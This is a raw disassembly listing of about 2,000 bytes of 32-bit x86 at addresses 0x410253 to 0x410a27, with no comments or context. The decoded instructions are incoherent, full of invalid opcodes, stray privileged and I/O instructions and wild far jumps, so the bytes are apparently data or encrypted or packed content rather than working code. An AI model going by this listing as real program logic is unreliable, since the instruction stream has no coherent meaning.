  410253:	and    DWORD PTR [ecx],0x3d
  410256:	jge    0x410236
  410258:	(bad)  
  410259:	sub    DWORD PTR [ecx+0x5731a2b5],esp
  41025f:	sub    eax,0xb2b1625a
  410264:	shr    BYTE PTR [esi+0x34],cl
  410267:	mov    DWORD PTR [ebx+esi*1-0xb],edx
  41026b:	xor    al,0xb3
  41026d:	inc    esi
  41026e:	sub    al,0x8d
  410270:	sub    DWORD PTR [esi+0xb],esi
  410273:	add    al,0xbc
  410276:	nop
  410277:	push   edi
  410278:	std    
  410279:	add    esi,DWORD PTR [ecx+0x6708e641]
  41027f:	xlat   BYTE PTR ds:[ebx]
  410280:	sbb    esi,0xffffffb6
  410283:	aad    0x11
  410285:	push   eax
  410286:	inc    esi
  410287:	lock jmp 0x9b620a2
  41028d:	ss push eax
  41028f:	imul   ebx,DWORD PTR [edi-0x2dd4c310],0x9d3417e1
  410299:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41029a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41029b:	in     eax,dx
  41029c:	jbe    0x4102ee
  41029e:	fisub  DWORD PTR [edx+0x61]
  4102a1:	push   ss
  4102a2:	dec    ebx
  4102a3:	(bad)  
  4102a5:	cmp    DWORD PTR [ebp-0x2ab15150],ecx
  4102ab:	ficomp DWORD PTR fs:[edi]
  4102ae:	mov    ds:0xe3d8c9ed,eax
  4102b3:	leave  
  4102b4:	pop    edx
  4102b5:	(bad)  
  4102b6:	adc    edi,ebp
  4102b8:	jne    0x410309
  4102ba:	and    eax,0xa7592728
  4102bf:	push   esi
  4102c0:	dec    ecx
  4102c1:	fbld   TBYTE PTR [edi-0x37]
  4102c4:	add    DWORD PTR ds:0x3dfeb9a,ebx
  4102ca:	push   ebp
  4102cb:	cmc    
  4102cc:	pushf  
  4102cd:	cs inc eax
  4102cf:	mov    ecx,edi
  4102d1:	pop    ss
  4102d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102d3:	mov    WORD PTR [edi+0x5f2ace99],es
  4102d9:	cs aam 0x96
  4102dc:	dec    esi
  4102dd:	mov    BYTE PTR [ebx+0x48],ch
  4102e0:	mov    DWORD PTR [ebp-0x1af3526],eax
  4102e6:	mov    al,0x9
  4102e8:	jb     0x4102af
  4102ea:	jo     0x410290
  4102ec:	pop    eax
  4102ed:	cdq    
  4102ee:	fimul  WORD PTR [esi]
  4102f0:	xlat   BYTE PTR ds:[ebx]
  4102f1:	pop    ss
  4102f2:	jl     0x410310
  4102f4:	popf   
  4102f5:	jb     0x410327
  4102f7:	jns    0x4102d4
  4102f9:	shl    ebx,cl
  4102fb:	imul   dl
  4102fd:	test   DWORD PTR [eax],edi
  4102ff:	push   edi
  410300:	mov    edi,0x120371d0
  410305:	retf   0x7b19
  410308:	xchg   esi,eax
  410309:	cmc    
  41030a:	leave  
  41030b:	and    esi,DWORD PTR [edi+0x4a]
  41030e:	mov    ecx,DWORD PTR [esi+esi*8-0x3c]
  410312:	cmp    BYTE PTR [esi],0xc6
  410315:	test   eax,0xd372c117
  41031a:	add    ebx,DWORD PTR [edx+0x26660204]
  410320:	inc    ebx
  410321:	push   ebx
  410322:	in     al,0x15
  410324:	inc    ebp
  410325:	push   esp
  410326:	push   ebx
  410327:	add    al,0xb1
  410329:	js     0x41030a
  41032b:	sub    esp,edx
  41032d:	scas   al,BYTE PTR es:[edi]
  41032e:	(bad)  
  41032f:	cmp    al,0xf3
  410331:	add    eax,0x1fc9c4b0
  410336:	mov    edi,ds
  410338:	gs loop 0x4102f4
  41033b:	push   edi
  41033c:	xor    ecx,DWORD PTR [ebp-0x5c]
  41033f:	(bad)  
  410340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410341:	sbb    DWORD PTR [ebx],ecx
  410343:	btc    DWORD PTR [eax+0x659f788c],0x6c
  41034b:	rol    DWORD PTR [ecx+0x18],1
  41034e:	pop    esp
  41034f:	aam    0x20
  410351:	dec    ebp
  410352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410353:	push   es
  410354:	ror    DWORD PTR [edi],cl
  410356:	std    
  410357:	gs mov esp,0xb3507d82
  41035d:	test   al,0x34
  41035f:	dec    eax
  410360:	xchg   edi,eax
  410361:	fcmovnu st,st(0)
  410363:	sbb    eax,0xf60e5814
  410368:	xchg   edi,eax
  410369:	stos   BYTE PTR es:[edi],al
  41036a:	mov    dh,0x8f
  41036c:	js     0x410356
  41036e:	shl    DWORD PTR [edi+0x68],0x49
  410372:	xor    al,0x1
  410374:	ret    0xeebd
  410377:	or     eax,DWORD PTR [eax-0x56ca8b64]
  41037d:	sbb    cl,ah
  41037f:	popf   
  410380:	adc    eax,0xbd14eec2
  410385:	cmp    eax,0xb8f198c6
  41038a:	je     0x41033f
  41038c:	nop
  41038d:	sbb    eax,0x5a4c1af6
  410392:	jle    0x4103f1
  410394:	daa    
  410395:	ret    0xf5af
  410398:	cmp    DWORD PTR [edi],eax
  41039a:	gs jno 0x4103af
  41039d:	dec    esi
  41039e:	pop    ss
  41039f:	or     eax,0xf662d888
  4103a4:	sbb    eax,0x9e2d86fc
  4103a9:	mov    edx,0x9262bb2e
  4103ae:	gs mov dh,0x79
  4103b1:	xchg   ebx,eax
  4103b2:	xor    edx,DWORD PTR [edi]
  4103b4:	mov    ebx,0x2dce362
  4103b9:	dec    edi
  4103ba:	sti    
  4103bb:	in     eax,dx
  4103bc:	les    esp,FWORD PTR gs:[esi+0x741d4674]
  4103c3:	and    eax,DWORD PTR [ecx+0x74]
  4103c6:	jo     0x4103ce
  4103c8:	adc    bl,al
  4103ca:	sub    BYTE PTR [esi],0xe2
  4103cd:	sar    BYTE PTR [edi],cl
  4103cf:	dec    edx
  4103d0:	jno    0x410394
  4103d2:	call   0x5724310
  4103d7:	mov    al,ds:0xd0cc07a
  4103dc:	mov    al,BYTE PTR [ecx-0x582ed4a9]
  4103e2:	shr    BYTE PTR ss:[esi-0x23],cl
  4103e6:	test   DWORD PTR [esi-0x4dcfbb32],ecx
  4103ec:	cmp    edi,esp
  4103ee:	std    
  4103ef:	xlat   BYTE PTR ds:[ebx]
  4103f0:	hlt    
  4103f1:	repz jmp 0xebc8cb87
  4103f7:	inc    ebx
  4103f8:	mov    eax,0xff2fbec
  4103fd:	lea    ebx,[edi]
  4103ff:	loope  0x410415
  410401:	add    ch,BYTE PTR [edi]
  410403:	xchg   esp,eax
  410404:	fsubr  DWORD PTR [ecx-0x9]
  410407:	pop    ss
  410408:	std    
  410409:	push   edx
  41040a:	sbb    ch,BYTE PTR [ebx]
  41040c:	loope  0x4103b5
  41040e:	sub    eax,0xb2b9f8c
  410413:	push   esi
  410414:	cwde   
  410415:	fld    TBYTE PTR [edi-0x45]
  410418:	push   edi
  410419:	xor    ebx,DWORD PTR [esi-0x6c89500c]
  41041f:	cmc    
  410420:	fcomp  DWORD PTR [edx+0x31]
  410423:	pop    esi
  410424:	lods   eax,DWORD PTR ds:[esi]
  410425:	push   esp
  410426:	push   0x71
  410428:	xchg   DWORD PTR [eax],eax
  41042a:	jb     0x410450
  41042c:	rcr    BYTE PTR [edi],0xa5
  41042f:	xor    BYTE PTR [edi],dl
  410431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410432:	add    ecx,DWORD PTR [edi]
  410434:	test   dl,bh
  410436:	sahf   
  410437:	mov    bl,BYTE PTR [ecx+0x5a]
  41043a:	push   esp
  41043b:	gs ins DWORD PTR es:[edi],dx
  41043d:	clc    
  41043e:	xchg   ebp,eax
  41043f:	sbb    BYTE PTR [edi-0x67],cl
  410442:	outs   dx,BYTE PTR ds:[esi]
  410443:	inc    edx
  410444:	push   cs
  410445:	aas    
  410446:	cmp    al,0x56
  410448:	pusha  
  410449:	iret   
  41044a:	sub    eax,0x3b92c3ff
  41044f:	jno    0x41047d
  410451:	icebp  
  410452:	jmp    0x12c8:0x11e75449
  410459:	lods   al,BYTE PTR ds:[esi]
  41045a:	mov    al,ds:0xcfd56db7
  41045f:	test   BYTE PTR [edx],bh
  410461:	jb     0x410441
  410463:	addr16 pop ds
  410465:	jle    0x410484
  410467:	cdq    
  410468:	xor    al,0xfb
  41046a:	jno    0x4103ed
  41046c:	mov    eax,0xc8f7877b
  410471:	mov    esi,0x17be8378
  410476:	inc    ebx
  410477:	sub    ecx,DWORD PTR [eax+0x10b90a88]
  41047d:	jno    0x41041e
  41047f:	loopne 0x4104a3
  410481:	ror    DWORD PTR [ebx-0x3b],0x75
  410485:	push   ss
  410486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410487:	call   0xd49c0e7a
  41048c:	mov    esp,0xdd3ff0fc
  410491:	cmp    BYTE PTR [esi],ah
  410493:	in     al,0xe7
  410495:	fcomp  DWORD PTR [edi+0x25]
  410498:	pushf  
  410499:	mov    ebx,0x61a4fa49
  41049e:	dec    esp
  41049f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104a0:	(bad)  
  4104a2:	push   esp
  4104a3:	outs   dx,BYTE PTR ds:[esi]
  4104a4:	xor    ecx,esp
  4104a6:	jo     0x410523
  4104a8:	rcl    BYTE PTR ds:0x98bfcdc4,1
  4104ae:	ins    BYTE PTR es:[edi],dx
  4104af:	mov    esp,0x8592b409
  4104b4:	jg     0x41046f
  4104b6:	mov    WORD PTR [edx+0x63],?
  4104b9:	scas   eax,DWORD PTR es:[edi]
  4104ba:	daa    
  4104bb:	push   ds
  4104bc:	xlat   BYTE PTR ds:[ebx]
  4104bd:	mov    ebp,0xf650cafd
  4104c2:	adc    ecx,ecx
  4104c4:	nop
  4104c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104c6:	pop    ebx
  4104c7:	jle    0x4104d2
  4104c9:	ins    BYTE PTR es:[edi],dx
  4104ca:	ins    DWORD PTR es:[edi],dx
  4104cb:	pop    ebx
  4104cc:	xchg   ebp,eax
  4104cd:	mov    esp,0xf9544a51
  4104d2:	push   ebx
  4104d3:	xchg   DWORD PTR [ecx+0x70],eax
  4104d6:	pop    eax
  4104d7:	call   0xde4c:0xf5ba5adc
  4104de:	mov    gs,WORD PTR [edx+0x7]
  4104e1:	test   BYTE PTR [esi],ch
  4104e3:	mov    ecx,DWORD PTR [edi+eax*2]
  4104e6:	sub    al,0x69
  4104e8:	mov    dh,0x20
  4104ea:	push   esp
  4104eb:	inc    edi
  4104ec:	push   esp
  4104ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104ee:	aaa    
  4104ef:	icebp  
  4104f0:	mov    ss,ebx
  4104f2:	dec    esi
  4104f3:	cs jno 0x4104ba
  4104f6:	ins    BYTE PTR es:[edi],dx
  4104f7:	loopne 0x410494
  4104f9:	pop    ss
  4104fa:	jbe    0x41057a
  4104fc:	jmp    0x2d3812a8
  410501:	pop    ebx
  410502:	sbb    DWORD PTR [ecx-0x39f6c45c],eax
  410508:	shl    DWORD PTR [ebp-0x4ad8217c],1
  41050e:	inc    ecx
  41050f:	push   edx
  410510:	adc    eax,0x8669397b
  410515:	ficom  DWORD PTR [edx+eiz*2+0x334b5b0d]
  41051c:	addr16 jp 0x410587
  41051f:	adc    BYTE PTR [edx+0x7ea51cfb],dh
  410525:	xor    BYTE PTR [esi-0x7b4a696f],0xe3
  41052c:	cmp    al,0xae
  41052e:	mov    esi,0xf99a51e0
  410533:	xor    ch,BYTE PTR [edx+eiz*1-0x6]
  410537:	dec    BYTE PTR [ebx-0x7a653bc6]
  41053d:	test   eax,0x38821dd
  410542:	jg     0x41057f
  410544:	sti    
  410545:	adc    ecx,esp
  410547:	pop    ebx
  410548:	ins    BYTE PTR es:[edi],dx
  410549:	jbe    0x41058e
  41054b:	dec    esp
  41054c:	mov    al,0xf4
  41054e:	xchg   ecx,eax
  41054f:	or     esp,DWORD PTR [ebp-0x471dcd3c]
  410555:	daa    
  410556:	fneni(8087 only) 
  410558:	ss mov bh,0xf6
  41055b:	inc    ecx
  41055c:	jo     0x4c370034
  410562:	cmc    
  410563:	push   0xffffffb5
  410565:	and    eax,0x9b41c991
  41056a:	cmp    eax,0xa3bcc4e3
  41056f:	pop    esp
  410570:	loope  0x410555
  410572:	sbb    ch,ah
  410574:	push   esp
  410575:	pop    es
  410576:	loope  0x4105e5
  410578:	pop    edi
  410579:	neg    DWORD PTR [ecx+eax*8-0x5b]
  41057d:	mov    al,ds:0xafec33aa
  410582:	jge    0x4105b3
  410584:	(bad)  
  410585:	test   al,0xbb
  410587:	cwde   
  410588:	scas   al,BYTE PTR es:[edi]
  410589:	js     0x410519
  41058b:	dec    edx
  41058c:	lock lea edx,ds:0x67ecfcf0
  410593:	les    esi,FWORD PTR [eax]
  410595:	add    eax,0xdadbe0bf
  41059a:	sbb    BYTE PTR ds:0x9bf8450b,al
  4105a0:	icebp  
  4105a1:	xchg   ebx,eax
  4105a2:	pop    edi
  4105a3:	out    0x22,al
  4105a5:	jae    0x4105d4
  4105a7:	cmc    
  4105a8:	mov    al,0x98
  4105aa:	add    DWORD PTR [ebx-0x7615e673],esp
  4105b0:	jbe    0x410601
  4105b2:	call   0x6baeb73d
  4105b7:	or     DWORD PTR [ebx+0x33],esp
  4105ba:	bound  eax,QWORD PTR [ebx+0x58f6c8bf]
  4105c0:	mov    eax,0x23e2bf89
  4105c5:	cwde   
  4105c6:	sbb    ebx,DWORD PTR [esi]
  4105c8:	xor    esi,eax
  4105ca:	push   es
  4105cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105cc:	fnsetpm(287 only) 
  4105ce:	push   edi
  4105cf:	sub    BYTE PTR [edi-0x4],ah
  4105d2:	push   0xffffffe7
  4105d4:	or     esi,DWORD PTR [ebx]
  4105d6:	or     dl,BYTE PTR [ecx]
  4105d8:	jno    0x4105d3
  4105da:	add    DWORD PTR [eax-0xa31f67a],eax
  4105e0:	mov    eax,0x15de86c5
  4105e5:	xchg   edx,eax
  4105e6:	pop    ebp
  4105e7:	in     eax,dx
  4105e8:	and    eax,0x7a424ca0
  4105ed:	mov    esp,0x52442a36
  4105f2:	aam    0x91
  4105f4:	sbb    al,0x4b
  4105f6:	cld    
  4105f7:	push   ebx
  4105f8:	test   eax,0x5c76e49c
  4105fd:	xchg   edi,eax
  4105fe:	and    al,0x24
  410600:	stos   BYTE PTR es:[edi],al
  410601:	inc    ebp
  410602:	inc    esp
  410603:	or     BYTE PTR [eax],cl
  410605:	rcl    DWORD PTR [ebx],1
  410607:	push   es
  410608:	dec    ecx
  410609:	cs js  0x4105f9
  41060c:	push   eax
  41060d:	sbb    edi,DWORD PTR [edx-0x55]
  410610:	enter  0xda8a,0x45
  410614:	jmp    0x3f07:0x1ffaf9e4
  41061b:	adc    DWORD PTR [ebx+0x39bc28d9],ebx
  410621:	ret    
  410622:	clc    
  410623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410624:	outs   dx,DWORD PTR ds:[esi]
  410625:	outs   dx,DWORD PTR ds:[esi]
  410626:	dec    esp
  410627:	mov    al,ds:0x2dcbc5b3
  41062c:	je     0x41067c
  41062e:	into   
  41062f:	sub    ch,cl
  410631:	cs in  al,dx
  410633:	adc    eax,0x7c77552f
  410638:	data16 lahf 
  41063a:	jecxz  0x410699
  41063c:	daa    
  41063d:	inc    eax
  41063e:	mov    eax,0xb8f2536f
  410643:	push   es
  410644:	jle    0x4105f0
  410646:	int    0xdc
  410648:	mov    al,0x78
  41064a:	std    
  41064b:	in     al,dx
  41064c:	jg     0x410611
  41064e:	icebp  
  41064f:	aam    0x3
  410651:	or     DWORD PTR [ecx+0x76],eax
  410654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410655:	pop    esp
  410656:	(bad)  
  410657:	daa    
  410658:	in     al,dx
  410659:	mov    ah,0xea
  41065b:	sbb    ah,BYTE PTR [esi-0x3a]
  41065e:	leave  
  41065f:	mov    DWORD PTR [eax+0x7],0x5877428
  410666:	test   eax,0xf2189023
  41066b:	fbld   TBYTE PTR [edi-0x17c823b7]
  410671:	xchg   esp,eax
  410672:	cmp    eax,0x81face27
  410677:	stos   DWORD PTR es:[edi],eax
  410678:	sub    al,0x32
  41067a:	pop    edi
  41067b:	xor    al,0x31
  41067d:	add    bl,al
  41067f:	dec    ecx
  410680:	pop    ebp
  410681:	add    dl,dh
  410683:	or     ch,BYTE PTR [ecx+0x4875841b]
  410689:	out    0x1e,al
  41068b:	cmc    
  41068c:	adc    DWORD PTR [eax],esi
  41068e:	popa   
  41068f:	jbe    0x410639
  410691:	mov    ecx,0x39c7a3c
  410696:	cmp    dl,BYTE PTR [edi-0xb49af32]
  41069c:	and    bl,ch
  41069e:	mov    ebp,0x2b938a8d
  4106a3:	inc    ebp
  4106a4:	mov    dh,0x45
  4106a6:	aaa    
  4106a7:	and    ebp,DWORD PTR [edi-0x1a]
  4106aa:	adc    BYTE PTR [ecx+ebx*1],dh
  4106ad:	ror    BYTE PTR [ecx-0x21],0x53
  4106b1:	cmp    esp,DWORD PTR [ecx]
  4106b3:	mov    ch,0x30
  4106b5:	sub    eax,0x1da1568d
  4106ba:	out    0x65,al
  4106bc:	ret    
  4106bd:	or     esi,DWORD PTR [eax]
  4106bf:	retf   0x1143
  4106c2:	arpl   sp,sp
  4106c4:	sti    
  4106c5:	std    
  4106c6:	mov    eax,0x3c4807e5
  4106cb:	add    eax,0x7b729659
  4106d0:	xor    BYTE PTR [edi+0x33de0602],cl
  4106d6:	or     cl,bl
  4106d8:	inc    esi
  4106d9:	mov    ch,BYTE PTR [esi]
  4106db:	out    dx,eax
  4106dc:	dec    ecx
  4106dd:	rol    ecx,cl
  4106df:	ror    bh,0x10
  4106e2:	sbb    bh,BYTE PTR [edx-0xa1d4d73]
  4106e8:	bound  edx,QWORD PTR [ebp-0x51dd35b2]
  4106ee:	push   esi
  4106ef:	jmp    0xc8bb:0xad8b1153
  4106f6:	and    BYTE PTR [edi],dl
  4106f8:	fs pop esi
  4106fa:	add    ebx,DWORD PTR [ebx-0x76]
  4106fd:	imul   DWORD PTR [edx-0x2058be2b]
  410703:	test   cl,ch
  410705:	sub    eax,0x20082fc8
  41070a:	mov    ah,0x56
  41070c:	xchg   edi,eax
  41070d:	aaa    
  41070e:	cmp    eax,0x4d4e65ed
  410713:	add    BYTE PTR [edx],ah
  410715:	lods   eax,DWORD PTR ds:[esi]
  410716:	push   es
  410717:	push   ebx
  410718:	inc    ebp
  410719:	in     al,0x22
  41071b:	das    
  41071c:	xor    BYTE PTR [ebx-0x3e],dl
  41071f:	jno    0x4106c0
  410721:	fmul   st,st(0)
  410723:	pop    es
  410724:	cmp    bl,dl
  410726:	jmp    0x41079d
  410728:	inc    ecx
  410729:	sbb    edx,DWORD PTR [edi-0x73]
  41072c:	loop   0x4106cd
  41072e:	fs in  al,0x8d
  410731:	and    bh,BYTE PTR [edx]
  410733:	ret    
  410734:	stos   BYTE PTR es:[edi],al
  410735:	inc    eax
  410736:	pop    ds
  410737:	cmp    DWORD PTR [edx],ebp
  410739:	pop    edi
  41073a:	js     0x4106e8
  41073c:	test   DWORD PTR [ebx-0x24],ecx
  41073f:	mov    bh,BYTE PTR [edx-0x76]
  410742:	test   eax,0x84bfb076
  410747:	xchg   ecx,eax
  410748:	xor    ebp,DWORD PTR [edx+0x3d]
  41074b:	shr    DWORD PTR ds:0xa0a60630,0x54
  410752:	jnp    0x4107bd
  410754:	jl     0x41076c
  410756:	xor    DWORD PTR [esi+esi*8+0x17b4aab6],eax
  41075d:	adc    DWORD PTR [edx],0xffffffff
  410760:	rcr    BYTE PTR ds:[edx-0x6168789a],cl
  410767:	mov    al,ds:0x688189da
  41076c:	pop    edx
  41076d:	inc    edx
  41076e:	xor    ecx,eax
  410770:	dec    eax
  410771:	pop    ebp
  410772:	pop    ss
  410773:	mov    dh,0x13
  410775:	cmp    bl,BYTE PTR [esi+0x37]
  410778:	push   edi
  410779:	cmp    bl,BYTE PTR [edi+0x43a046e2]
  41077f:	out    dx,eax
  410780:	test   DWORD PTR [ebx],edi
  410782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410783:	sbb    DWORD PTR [eax+edi*4-0x3d],esi
  410787:	fcomp  st(5)
  41078a:	mov    bh,0x9d
  41078c:	outs   dx,BYTE PTR ds:[esi]
  41078d:	and    BYTE PTR [ecx+eiz*1-0x3e],bh
  410791:	rcr    DWORD PTR [eax-0x29],0xa0
  410795:	stc    
  410796:	or     DWORD PTR [edi+edx*8],edx
  410799:	out    0xd,al
  41079b:	shl    BYTE PTR [esi],0x19
  41079e:	imul   ebp,DWORD PTR [edx-0x29],0xffffff95
  4107a2:	mov    ebp,0xc181c350
  4107a7:	(bad)  
  4107a8:	shr    DWORD PTR [ebx-0x6f59cf7c],cl
  4107ae:	or     al,0xb2
  4107b0:	mov    edx,0xd66ea4a2
  4107b5:	loope  0x410786
  4107b7:	sub    al,0xba
  4107b9:	jbe    0x410786
  4107bb:	imul   DWORD PTR [ebx+0x43247abd]
  4107c1:	push   ebx
  4107c2:	mov    bh,0xf7
  4107c4:	and    al,0x11
  4107c6:	pop    ds
  4107c7:	push   esp
  4107c8:	fs cs stos BYTE PTR es:[edi],al
  4107cb:	into   
  4107cc:	aam    0x3f
  4107ce:	test   DWORD PTR [edx],ecx
  4107d0:	cmp    eax,0x5bdaa280
  4107d5:	cmp    bh,BYTE PTR [ebx*8+0x843003d]
  4107dc:	loopne 0x4107f7
  4107de:	pop    ebx
  4107df:	add    eax,DWORD PTR fs:[edx+0x3fa555c1]
  4107e6:	xor    eax,0x6705a16
  4107eb:	cmc    
  4107ec:	xor    al,0x81
  4107ee:	pop    edi
  4107ef:	xchg   edx,eax
  4107f0:	repnz add dl,bl
  4107f3:	call   0xfd97:0x39d65fbc
  4107fa:	and    BYTE PTR [ecx-0x6d7efdb7],0xe8
  410801:	iret   
  410802:	mov    edx,0x4e65955f
  410807:	adc    eax,ebx
  410809:	pushf  
  41080a:	add    eax,0xd4315306
  41080f:	or     dh,BYTE PTR [ecx]
  410811:	adc    al,0x3b
  410813:	stos   DWORD PTR es:[edi],eax
  410814:	out    0x69,al
  410816:	add    edx,DWORD PTR [ebx]
  410818:	push   ss
  410819:	mov    ecx,DWORD PTR [eax]
  41081b:	aaa    
  41081c:	imul   ebx,DWORD PTR [ecx+0x4d],0xffffffff
  410820:	loope  0x410805
  410822:	in     eax,0xbf
  410824:	mov    ebx,0xbe8b969
  410829:	sbb    ecx,DWORD PTR [esi+0x69]
  41082c:	test   DWORD PTR [ebp+0x5d],ebx
  41082f:	pop    edi
  410830:	or     ebp,DWORD PTR [esi+0x5fdbab0d]
  410836:	jne    0x4107c6
  410838:	lahf   
  410839:	push   0x14
  41083b:	data16 and BYTE PTR [edi],al
  41083e:	push   0x8280e067
  410843:	loopne 0x410893
  410845:	ss and eax,0x7411b353
  41084b:	jo     0x41088f
  41084d:	fsub   QWORD PTR [ebx-0x4f]
  410850:	dec    ecx
  410852:	test   DWORD PTR [edx-0x31adfda5],ebp
  410858:	gs mov eax,0x3969c77f
  41085e:	xchg   edx,eax
  41085f:	shr    BYTE PTR [edx],cl
  410861:	hlt    
  410862:	xchg   BYTE PTR [eax],ah
  410864:	sti    
  410865:	push   ss
  410866:	not    ecx
  410868:	pop    eax
  410869:	inc    ecx
  41086a:	xlat   BYTE PTR ds:[ebx]
  41086b:	(bad)
  41086e:	call   0x4684e0d5
  410873:	mov    eax,0xb2a9f072
  410878:	fwait
  410879:	outs   dx,DWORD PTR ds:[esi]
  41087a:	dec    esp
  41087b:	mov    ah,0xfc
  41087d:	mov    ecx,0xb7ab83fe
  410882:	mov    ebp,0x46de7a21
  410887:	jae    0x41080d
  410889:	jecxz  0x410909
  41088b:	adc    al,0x94
  41088d:	dec    edx
  41088e:	pop    esi
  41088f:	xor    eax,DWORD PTR [ebx]
  410891:	adc    dh,BYTE PTR [edi-0x41992a38]
  410897:	mov    eax,0xcfa5bce3
  41089c:	mov    al,ds:0x83e2622e
  4108a1:	arpl   cx,bx
  4108a3:	sub    al,0x57
  4108a5:	xor    al,0xec
  4108a7:	mov    ebp,0x4e96aa84
  4108ac:	pop    eax
  4108ad:	sbb    BYTE PTR [eax-0x6bea4396],al
  4108b3:	mov    ebp,0x756217b0
  4108b8:	jno    0x410867
  4108ba:	add    al,0xfd
  4108bc:	ja     0x41088b
  4108be:	cmp    DWORD PTR [eax+eax*1+0x43ee87dd],eax
  4108c5:	es xchg ecx,eax
  4108c7:	jecxz  0x4108be
  4108c9:	mov    edx,eax
  4108cb:	out    0x95,eax
  4108cd:	pop    eax
  4108ce:	gs mov ebp,0x75014c0d
  4108d4:	mov    ds:0xaeb9f227,al
  4108d9:	jp     0x410949
  4108db:	icebp  
  4108dc:	js     0x410937
  4108de:	xor    al,BYTE PTR ds:0x56734395
  4108e4:	mov    al,0x5
  4108e6:	daa    
  4108e7:	pop    ebp
  4108e8:	dec    esp
  4108e9:	call   0xf3e5:0xd2468cad
  4108f0:	js     0x410942
  4108f2:	pop    edx
  4108f3:	shl    BYTE PTR [eax-0x8],0xc
  4108f7:	loope  0x410934
  4108f9:	arpl   WORD PTR [edi],bp
  4108fb:	jb     0x4108f1
  4108fd:	jl     0x4108a3
  4108ff:	bound  ebx,QWORD PTR [edx]
  410901:	cs daa 
  410903:	adc    eax,0xc535fa5e
  410908:	sbb    DWORD PTR [esi-0x6e43ab42],edi
  41090e:	in     al,0x76
  410910:	test   DWORD PTR [edi+0x17d0b17c],ebp
  410916:	push   esp
  410917:	cmp    eax,0x323d2158
  41091c:	jne    0x4108e3
  41091e:	adc    esi,esp
  410920:	loopne 0x41090f
  410922:	mov    esi,0x18c7d8e5
  410927:	mov    al,0x1a
  410929:	shl    BYTE PTR [eax-0x1d736282],cl
  41092f:	lea    esp,[ecx-0x354c6698]
  410935:	les    ebp,FWORD PTR [eax]
  410937:	mov    al,ds:0xc3939d80
  41093c:	pop    ss
  41093d:	xchg   esi,eax
  41093e:	push   esi
  41093f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410940:	pop    esi
  410941:	push   esi
  410942:	pusha  
  410943:	js     0x410928
  410945:	lds    eax,FWORD PTR [ebp+0x59270a8c]
  41094b:	push   ss
  41094c:	int3   
  41094d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41094e:	std    
  41094f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410950:	retf   0x9ead
  410953:	test   DWORD PTR [edx+0x47ef5aa9],edi
  410959:	(bad)  
  41095b:	(bad)  
  41095c:	and    al,BYTE PTR [ebp+0x1d7feefe]
  410962:	scas   eax,DWORD PTR es:[edi]
  410963:	jg     0x410976
  410965:	dec    esp
  410966:	xor    dl,BYTE PTR [ecx+eiz*1+0x29827a5]
  41096d:	fadd   DWORD PTR [esi]
  41096f:	mov    dl,0xbb
  410971:	div    DWORD PTR [edx+eax*4-0x24fffecd]
  410978:	repnz mov eax,0xa00dc6ee
  41097e:	cmp    cl,BYTE PTR [edi-0x49]
  410981:	aam    0x8d
  410983:	daa    
  410984:	mov    eax,DWORD PTR [eax]
  410986:	cmp    al,0x39
  410988:	and    BYTE PTR [eax],dl
  41098a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41098b:	loop   0x4109d7
  41098d:	mov    dh,0x46
  41098f:	sub    BYTE PTR [ebp+0x64d06a1b],dl
  410995:	mov    bh,0x2d
  410997:	jp     0x41093c
  410999:	ror    BYTE PTR [ebp+0x3e],1
  41099c:	hlt    
  41099d:	fidivr WORD PTR [edx-0x724e0d39]
  4109a3:	fdivr  QWORD PTR [ecx+0x68]
  4109a6:	in     eax,0xb0
  4109a8:	mov    esi,DWORD PTR [edx]
  4109aa:	inc    ecx
  4109ab:	ret    
  4109ac:	pop    ss
  4109ad:	sahf   
  4109ae:	popf   
  4109af:	outs   dx,DWORD PTR ds:[esi]
  4109b0:	mov    dh,0x3d
  4109b2:	cmp    BYTE PTR [ebp+0x18db2e1],dl
  4109b8:	push   cs
  4109b9:	ss retf 0x1f71
  4109bd:	cmc    
  4109be:	aaa    
  4109bf:	daa    
  4109c0:	xor    eax,DWORD PTR [esi+eiz*8-0x560eb8c5]
  4109c7:	sub    BYTE PTR [edx+0x37a596bc],dl
  4109cd:	xchg   ecx,eax
  4109ce:	and    ah,dh
  4109d0:	hlt    
  4109d1:	lea    esi,[ecx+0x2e]
  4109d4:	out    dx,eax
  4109d5:	cmp    BYTE PTR [edi+edi*2-0x15],0x40
  4109da:	jp     0x4109f8
  4109dc:	hlt    
  4109dd:	mov    bl,0x29
  4109df:	jle    0x4109a8
  4109e1:	bound  ebp,QWORD PTR [esi-0x2af27622]
  4109e7:	xchg   cx,ax
  4109e9:	cmp    cl,BYTE PTR [ebx+0x45a27d47]
  4109ef:	xchg   ebp,eax
  4109f0:	jns    0x410a37
  4109f2:	jne    0x410a5c
  4109f4:	mov    ecx,0x9dfd7cd0
  4109f9:	lock sub BYTE PTR ds:0x170ddae8,ch
  410a00:	fldenv [ecx+ebx*4+0x4c]
  410a04:	xchg   edx,eax
  410a05:	mov    ds:0x3c9c2508,eax
  410a0a:	mov    eax,ds:0x7d0da157
  410a0f:	sbb    esi,DWORD PTR [edi+0x63]
  410a12:	xchg   esp,eax
  410a13:	(bad)  
  410a14:	repz or BYTE PTR [eax-0xa],al
  410a18:	fstp   TBYTE PTR [ebx+edx*8]
  410a1b:	ds pop esp
  410a1d:	pop    ss
  410a1e:	shr    DWORD PTR [edx+esi*1],1
  410a21:	mov    bh,0xf8
  410a23:	dec    ebx
  410a24:	das    
  410a25:	retf   
  410a26:	cld    
  410a27:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
